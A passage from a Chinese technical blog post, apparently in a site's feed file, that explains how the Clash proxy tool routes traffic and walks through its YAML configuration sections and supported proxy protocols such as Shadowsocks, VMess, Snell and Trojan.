      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rental </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你了解Clash吗？</title>
      <link href="/2024/06/20/2024/how-does-clash-work/"/>
      <url>/2024/06/20/2024/how-does-clash-work/</url>
      
        <content type="html"><![CDATA[<p><a href="https://clash.wiki/">什么是 Clash? | Clash 知识库</a></p><p>有一说一，大家肯定都知道 Clash，但很多人对这东西的印象就是一个翻墙工具，导入订阅链接点几下就行，并不理解 Clash 究竟做了什么。</p><p>Clash 是一个运行在网络层和应用层的、基于规则的代理工具，它所能做的不仅仅是帮你转发流量到互联网访问其它应用（当然这算是主要功能）。Clash 在本质上是对用户本机的流量进行管理，实现智能路由和访问控制，如果你会写 Clash 配置文件的话，就可以轻松实现访问外网应用时自动走代理，而在访问指定国内应用时不走代理直接访问。</p><p>其工作原理和工作流程说来也简单，用一句话就能解释清楚：接收本机流量后根据规则进行转发，下文会对这一过程进行介绍。</p><p>看完这篇文章，你应该可以对 Clash 的本质以及其工作原理有一个相对清晰的认识，可以轻松看懂那些“订阅链接”背后是什么，并且可以独立编写 Clash 配置文件。</p><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p>我们可以把 Clash 的工作过程简单分为三步，</p><ol><li>**Inbound 入站：**当你在设备上启动 Clash 时，它会创建一个或多个本地监听端口，这些端口用于接收来自设备上的应用程序的网络请求；</li><li>**基于规则的路由：**Clash 配置文件中的 <strong><code>rules</code></strong> 部分定义了如何处理不同类型的网络请求。例如上文说的只转发部分流量；</li><li>**Outbound 出站：**Clash 根据配置文件中的规则，将入站的网络请求转发到不同的出站连接，可以连接到某个网络接口、某个代理服务器，也可以是某个策略组。</li></ol><p><img src="https://img.ma5hr00m.top/blog/20240613024509.png" alt="20240613024509"></p><h2 id="四种代理模式"><a href="#四种代理模式" class="headerlink" title="四种代理模式"></a>四种代理模式</h2><p>在 Clash 操作页面，可以看到四种代理模式，一般情况下选择“规则”就好，足够用户使用。这里对这四种都做一下介绍：</p><ol><li><strong>规则（Rule）</strong>：这是 Clash 配置中最重要的部分之一。规则用于定义哪些流量应该被代理，哪些应该直连。用户可以根据域名、IP、地理位置等条件来设置规则。</li><li><strong>直连（Direct）</strong>：直连选项通常用于设置哪些流量不需要通过代理服务器直接访问。这通常用于访问本地网络资源或者信任的网站。</li><li><strong>全局（Global）</strong>：全局模式下，所有的网络流量都会通过代理服务器。这个模式适用于需要代理所有流量的情况。</li><li><strong>脚本（Script）</strong>：脚本功能允许用户编写或使用现有的 JavaScript 脚本来自定义复杂的流量处理逻辑，比如修改请求头、响应内容等，从而实现更灵活的分流规则。</li></ol><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p><a href="https://clash.skk.moe/">https://clash.skk.moe/</a></p><p>前面说的入站、入站和规则都需要在配置文件中指定。Clash 的主配置文件名为 <code>config.yaml</code>，默认情况下会在 <code>$HOME/.config/clash</code> 目录读取配置文件。如果该目录不存在，Clash 会在该位置生成一个最小的配置文件。</p><p>如果需要指定其他位置的配置文件，需要在命令行中使用 <code>-f</code> 参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clash -f /etc/clash/config.yaml</span><br></pre></td></tr></table></figure><p>一份完整的 Clash 配置文件包括多个部分，下面一一介绍。</p><h3 id="General-配置"><a href="#General-配置" class="headerlink" title="General 配置"></a>General 配置</h3><p>在 Clash 配置文件中，General 配置包含了一些必需的字段以及可选的配置项，通常位于配置文件开头部分。其中 <code>port</code>，<code>socks-port</code> 和 <code>allow-lan</code> 是必需的字段，用于指定 Clash 的端口、SOCKS5 代理端口以及是否允许局域网连接。如果需要启用透明代理，还需要指定 <code>redir-port</code> 字段，用于指定透明代理的端口。</p><p>还有个特殊的 <code>mixed</code> 字段，用于指定混合配置端口，这个端口同时支持 HTTP(S) 和 SOCKS5 协议。</p><p>除了这些必需字段外，还有一些可选的配置项，下面简单罗列几个：</p><ul><li><code>dns</code>：用于配置DNS相关设置。</li><li><code>external-controller</code>：用于指定 RESTful API 的地址和端口。</li><li><code>secret</code>：可选项，用于设置 RESTful API 的密钥。</li><li><code>cfw-bypass</code>：可选项，用于配置规则以绕过代理。</li></ul><p>在编写 General 配置时可以参考以下内容，各个字段的作用都以注释的形式标注：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span> <span class="comment"># HTTP端口</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span> <span class="comment"># SOCKS5端口</span></span><br><span class="line"><span class="attr">redir-port:</span> <span class="number">7892</span> <span class="comment"># Linux和macOS的重定向端口</span></span><br><span class="line"><span class="attr">mixed:</span> <span class="number">7893</span> <span class="comment"># 混合端口</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅在设置allow-lan为true时适用</span></span><br><span class="line"><span class="comment"># &quot;*&quot;: 绑定所有IP地址</span></span><br><span class="line"><span class="comment"># 192.168.122.11: 绑定单个IPv4地址</span></span><br><span class="line"><span class="comment"># &quot;[aaaa::a8aa:ff:fe09:57d8]&quot;: 绑定单个IPv6地址</span></span><br><span class="line"><span class="attr">bind-address:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Rule / Global/ Direct（默认为Rule）</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将日志级别设置为stdout（默认为info）</span></span><br><span class="line"><span class="comment"># info / warning / error / debug / silent</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="attr">external-controller:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:9090</span> <span class="comment"># Clash的RESTful API</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 您可以将静态Web资源（如clash-dashboard）放入一个目录，并且Clash将在`$&#123;API&#125;/ui`中提供服务</span></span><br><span class="line"><span class="comment"># 输入是相对于配置目录的相对路径或绝对路径</span></span><br><span class="line"><span class="attr">external-ui:</span> <span class="string">&quot;path/to/local/clash-dashboard&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">secret:</span> <span class="string">&quot;&quot;</span> <span class="comment"># RESTful API的密钥（可选）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">experimental:</span> <span class="comment"># 实验性功能</span></span><br><span class="line">  <span class="attr">ignore-resolve-fail:</span> <span class="literal">true</span> <span class="comment"># 忽略DNS解析失败，默认值为true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地SOCKS5/HTTP(S)服务器的身份验证</span></span><br><span class="line"><span class="attr">authentication:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;user1:pass1&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;user2:pass2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实验性主机，支持通配符（例如*.clash.dev 甚至*.foo.*.example.com）</span></span><br><span class="line"><span class="comment"># 静态域比通配符域具有更高的优先级（foo.example.com &gt; *.example.com）</span></span><br><span class="line"><span class="attr">hosts:</span></span><br><span class="line">  <span class="attr">&#x27;*.clash.dev&#x27;:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  <span class="attr">&#x27;alpha.clash.dev&#x27;:</span> <span class="string">&#x27;::1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dns:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># 设置为true以启用DNS（默认为false）</span></span><br><span class="line">  <span class="attr">ipv6:</span> <span class="literal">false</span> <span class="comment"># 默认为false</span></span><br><span class="line">  <span class="attr">listen:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:53</span></span><br><span class="line">  <span class="attr">enhanced-mode:</span> <span class="string">fake-ip</span> <span class="comment"># 或redir-host</span></span><br><span class="line">  <span class="attr">fake-ip-range:</span> <span class="number">198.18</span><span class="number">.0</span><span class="number">.1</span><span class="string">/16</span> <span class="comment"># 如果不知道是什么，请勿更改</span></span><br><span class="line">  <span class="attr">nameserver:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tcp://1.1.1.1</span></span><br><span class="line">  <span class="attr">fallback:</span> <span class="comment"># 与nameserver并发请求，当GEOIP国家不是CN时使用fallback</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tls://dns.rubyfish.cn:853</span> <span class="comment"># DNS over TLS</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://1.1.1.1/dns-query</span> <span class="comment"># DNS over HTTPS</span></span><br><span class="line">  <span class="attr">fallback-filter:</span></span><br><span class="line">    <span class="attr">geoip:</span> <span class="literal">true</span> <span class="comment"># 默认</span></span><br><span class="line">    <span class="attr">ipcidr:</span> <span class="comment"># 这些子网中的IP将被视为污染</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">240.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">/4</span></span><br></pre></td></tr></table></figure><h3 id="Proxy-配置"><a href="#Proxy-配置" class="headerlink" title="Proxy 配置"></a>Proxy 配置</h3><p>Proxy 配置以及 Proxy Group 配置就是 Clash 控制流量出站的主要配置。</p><p>Proxy 配置用于指定 Clash 连接代理服务器的相关信息。这包括代理服务器的地址、端口、类型等信息。通过正确配置这一部分，Clash 可以根据你的需求将流量转发到不同的代理服务器。例如，你可以设置多个代理节点，并为它们指定不同的类型，如 <strong><code>ss</code></strong>、<strong><code>vmess</code></strong>、<strong><code>socks5</code></strong>、<strong><code>http</code></strong> 和 <strong><code>snell</code></strong>。</p><p>配置 Proxy 部分时可以参考以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">proxy:</span></span><br><span class="line">  <span class="comment"># shadowsocks</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;ss1&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">ss</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">server</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">    <span class="attr">cipher:</span> <span class="string">chacha20-ietf-poly1305</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">&quot;password&quot;</span></span><br><span class="line">    <span class="comment"># udp: true</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;ss2&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">ss</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">server</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">    <span class="attr">cipher:</span> <span class="string">chacha20-ietf-poly1305</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">&quot;password&quot;</span></span><br><span class="line">    <span class="attr">plugin:</span> <span class="string">v2ray-plugin</span></span><br><span class="line">    <span class="attr">plugin-opts:</span></span><br><span class="line">      <span class="attr">mode:</span> <span class="string">websocket</span></span><br><span class="line">      <span class="comment"># tls: true</span></span><br><span class="line">      <span class="comment"># skip-cert-verify: true</span></span><br><span class="line">      <span class="comment"># host: bing.com</span></span><br><span class="line">      <span class="comment"># path: &quot;/&quot;</span></span><br><span class="line">      <span class="comment"># mux: true</span></span><br><span class="line">      <span class="comment"># headers:</span></span><br><span class="line">      <span class="comment">#   custom: value</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># vmess</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;vmess&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">vmess</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">server</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">    <span class="attr">uuid:</span> <span class="string">uuid</span></span><br><span class="line">    <span class="attr">alterid:</span> <span class="number">32</span></span><br><span class="line">    <span class="attr">cipher:</span> <span class="string">auto</span></span><br><span class="line">    <span class="comment"># udp: true</span></span><br><span class="line">    <span class="comment"># tls: true</span></span><br><span class="line">    <span class="comment"># skip-cert-verify: true</span></span><br><span class="line">    <span class="comment"># network: ws</span></span><br><span class="line">    <span class="comment"># ws-path: /path</span></span><br><span class="line">    <span class="comment"># ws-headers:</span></span><br><span class="line">    <span class="comment">#   host: v2ray.com</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># socks5</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;socks&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">server</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">    <span class="comment"># username: username</span></span><br><span class="line">    <span class="comment"># password: password</span></span><br><span class="line">    <span class="comment"># tls: true</span></span><br><span class="line">    <span class="comment"># skip-cert-verify: true</span></span><br><span class="line">    <span class="comment"># udp: true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># http</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;http&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">server</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">    <span class="comment"># username: username</span></span><br><span class="line">    <span class="comment"># password: password</span></span><br><span class="line">    <span class="comment"># tls: true</span></span><br><span class="line">    <span class="comment"># skip-cert-verify: true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># snell</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;snell&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">snell</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">server</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">44046</span></span><br><span class="line">    <span class="attr">psk:</span> <span class="string">yourpsk</span></span><br><span class="line">    <span class="comment"># obfs-opts:</span></span><br><span class="line">    <span class="comment">#   mode: http</span></span><br><span class="line">    <span class="comment">#   host: bing.com</span></span><br></pre></td></tr></table></figure><h3 id="Proxy-Group-配置"><a href="#Proxy-Group-配置" class="headerlink" title="Proxy Group 配置"></a>Proxy Group 配置</h3><p>proxy group 配置部分的作用是定义策略组，这些策略组可以在规则中使用来决定网络请求通过哪个代理节点。策略组允许你根据不同的场景和需求，组合和管理多个代理节点。例如，你可以创建一个策略组来自动选择延迟最低的节点，或者创建一个策略组来手动选择特定的节点。</p><p>配置 Proxy Group 部分时可以参考以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">proxy-group:</span></span><br><span class="line">  <span class="comment"># url-test 通过测试访问 URL 的速度来选择使用哪个代理。</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;auto&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ss1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ss2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">vmess1</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&#x27;http://www.gstatic.com/generate_204&#x27;</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># fallback 通过优先级选择可用的策略。可用性通过访问 URL 来测试，就像自动 url-test 组一样。</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;fallback-auto&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">fallback</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ss1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ss2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">vmess1</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&#x27;http://www.gstatic.com/generate_204&#x27;</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># load-balance: 相同 eTLD 的请求将在同一个代理上拨号。</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;load-balance&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">load-balance</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ss1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ss2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">vmess1</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&#x27;http://www.gstatic.com/generate_204&#x27;</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># select 用于选择代理或代理组</span></span><br><span class="line">  <span class="comment"># 您可以使用 RESTful API 切换代理，推荐在 GUI 中使用。</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Proxy</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ss1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ss2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">vmess1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">auto</span></span><br></pre></td></tr></table></figure><h3 id="Rule-配置"><a href="#Rule-配置" class="headerlink" title="Rule 配置"></a>Rule 配置</h3><p>Rule 配置部分的作用是定义网络请求的匹配规则，以决定哪些请求应该被代理、直连或拒绝。这些规则基于请求的不同属性，如域名、IP 地址、端口号或地理位置来匹配流量。</p><p>配置 Rule 部分时可以参考以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rule:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">domain-suffix,google.com,[策略组的名称]</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">domain-keyword,google,[策略组的名称]</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">domain,google.com,[策略组的名称]</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">domain-suffix,ad.com,REJECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ip-cidr,127.0.0.0/8,DIRECT</span></span><br><span class="line">  <span class="comment"># rename source-ip-cidr and would remove after prerelease</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">src-ip-cidr,192.168.1.201/32,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">geoip,CN,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">dst-port,80,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">src-port,7777,DIRECT</span></span><br><span class="line">  <span class="comment"># final would remove after prerelease</span></span><br><span class="line">  <span class="comment"># you also can use `final,Proxy` or `final,,Proxy` now</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">match,[策略组的名称]</span></span><br></pre></td></tr></table></figure><p>后面会详细介绍每一种可用的规则，后面再细看。</p><h2 id="Inbound-入站协议"><a href="#Inbound-入站协议" class="headerlink" title="Inbound 入站协议"></a>Inbound 入站协议</h2><ul><li>SOCKS5</li><li>HTTP(S)</li><li>Redirect TCP</li><li>TProxy TCP</li><li>TProxy UDP</li><li>Linux TUN 设备（仅 Premium 版本）</li></ul><p><a href="https://www.txthinking.com/talks/articles/socks5-and-http-proxy.article">一口气搞明白有点奇怪的 Socks 5 协议以及 HTTP 代理</a></p><p>入站协议中主要就是对 SOCKS5 和 HTTP 做区分，三种透明代理后面单独说。</p><p>SOCKS5 代理提供全面的网络协议支持，支持认证、更安全，同时支持 UDP 协议，以及提供了较好的性能和兼容性。HTTP 代理则仅能代理 HTTP 和 HTTPS 协议的流量，通常用于网页浏览，它可以高效地缓存数据，降低带宽消耗，但不适用于所有网络协议。</p><p>一般浏览网页的话配个 HTTP 代理就行，其他情况直接 SOCKS5。</p><h2 id="Outbound-出站-Proxy"><a href="#Outbound-出站-Proxy" class="headerlink" title="Outbound 出站 Proxy"></a>Outbound 出站 Proxy</h2><p>Clash 出站种类较多，且各自使用场景不同。前面讲过了配置文件的写法，可以把 Clash 出站分为 Proxy 和 Proxy Group 两种，这里也分开介绍。</p><h3 id="Shadowsocks-ShadowsocksR"><a href="#Shadowsocks-ShadowsocksR" class="headerlink" title="Shadowsocks&#x2F;ShadowsocksR"></a>Shadowsocks&#x2F;ShadowsocksR</h3><p><a href="https://itlanyan.com/on-fuck-gfw-again/">Shadowsocks&#x2F;SS教程 - tlanyan</a></p><p><strong>Shadowsocks</strong> 是一个基于 SOCKS5 协议的加密代理，它使用各种加密方法来保护数据流。Clash 支持的 Shadowsocks 加密方法包括：</p><table><thead><tr><th>系列</th><th>加密方法</th></tr></thead><tbody><tr><td>AEAD</td><td>aes-128-gcm, aes-192-gcm, aes-256-gcm, chacha20-ietf-poly1305, xchacha20-ietf-poly1305</td></tr><tr><td>流式</td><td>aes-128-cfb, aes-192-cfb, aes-256-cfb, rc4-md5, chacha20-ietf, xchacha20</td></tr><tr><td>块式</td><td>aes-128-ctr, aes-192-ctr, aes-256-ctr</td></tr></tbody></table><p>此外，Clash 还支持 Shadowsocks 的插件，如 obfs 和 v2ray-plugin，这些插件可以提供额外的混淆功能，进一步增强隐私保护。</p><p><strong>ShadowsocksR</strong> 是 Shadowsocks 的一个扩展版本，它增加了更多的混淆和协议选项，以提高抗审查能力。Clash 支持的 ShadowsocksR 加密方法和混淆方法包括：</p><table><thead><tr><th>系列</th><th>加密方法</th></tr></thead><tbody><tr><td>流式</td><td>aes-128-cfb, aes-192-cfb, aes-256-cfb, rc4-md5, chacha20-ietf, xchacha20</td></tr></tbody></table><p>一般情况下，我们现在各种平台的订阅基本都是默认的 ss 协议。</p><p>补充个小趣闻，ssr 协议在其发展过程中引起了一些争议。最初，ssr 项目因为违反 GPL 许可证而受到批评。原开发者对此表示不满，因为这违反了开源项目的基本原则。后来，ssr 项目改为采用与 ss 相同的 GPL、Apache 许可证、MIT 许可证等多重自由软件许可协议，缓解了部分争议。</p><h3 id="Vmess"><a href="#Vmess" class="headerlink" title="Vmess"></a>Vmess</h3><p><strong>VMess</strong> 是一个无状态的加密通信协议，且所有数据都通过 TCP 传输。</p><p>每当 VMess 客户端发起请求时，服务器会判断是否来自合法客户端。如果验证通过，请求就会被转发。之后，获得的响应会被发送回客户端。VMess 使用非对称格式，客户端的请求和服务器的响应格式不同。</p><p>Clash 支持以下 Vmess 的加密方法:</p><ul><li>auto：自动选择，默认值。</li><li>aes-128-gcm：推荐在 PC 上使用。它是一种高效的加密算法，通常用于需要高吞吐量的应用。</li><li>chacha20-poly1305：推荐在移动设备上使用。它适用于那些没有硬件AES 加速的设备，因为它在软件实现中更快。</li><li>none</li></ul><h3 id="SOCKS5"><a href="#SOCKS5" class="headerlink" title="SOCKS5"></a>SOCKS5</h3><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><h3 id="Snell"><a href="#Snell" class="headerlink" title="Snell"></a>Snell</h3><p>Clash 也集成了对 Snell 的支持。</p><p><strong>Snell</strong> 是一种精简的加密代理协议，由 Surge 团队开发，也是一种较为经典的反审查协议。它的设计初衷是为了提供极致的性能和简单的配置过程，同时支持 UDP over TCP中继。此外，Snell 是单一二进制文件，零依赖（除了glibc），这也使得 Snell 易于部署和维护。<br>该协议的使用场景主要集中在需要绕过网络审查、保护隐私和数据加密的环境中。由于其高性能和简单配置的特点，Snell适用于个人用户和小型企业，尤其是在网络审查较为严格的地区。</p><p>小提示，Snell@v4 没有提供向下兼容，需要客户端服务端均进行升级。</p><p>想知道更多相关知识去看这个 gitbook：<a href="https://manual.nssurge.com/others/snell.html">https://manual.nssurge.com/others/snell.html</a></p><h3 id="Trojan"><a href="#Trojan" class="headerlink" title="Trojan"></a>Trojan</h3><p>Clash 内置了对流行协议 Trojan 的支持。</p><p><strong>Trojan</strong> 是近几年才兴起的网络工具，特点同样是确保数据传输的安全性和隐私性。但与传统的 ss&#x2F;ssr 不同的是，ss&#x2F;ssr 保证数据传输安全的手段是加密混淆，而 Trojan 的思路是将流量伪装成最常见的 HTTPS 流量。</p><p><a href="https://itlanyan.com/trojan-tutorial/">trojan教程 - tlanyan</a></p><h2 id="Outbound-出站-Proxy-Groups"><a href="#Outbound-出站-Proxy-Groups" class="headerlink" title="Outbound 出站 Proxy Groups"></a>Outbound 出站 Proxy Groups</h2><p>Proxy Groups 策略组用于根据不同策略分发规则传递过来的请求，其可以直接被规则引用，也可以被其他策略组引用，而最上级策略组被规则引用。</p><h3 id="Relay-中继"><a href="#Relay-中继" class="headerlink" title="Relay 中继"></a>Relay 中继</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Relay:</span></span><br><span class="line">  <span class="bullet">-</span> <span 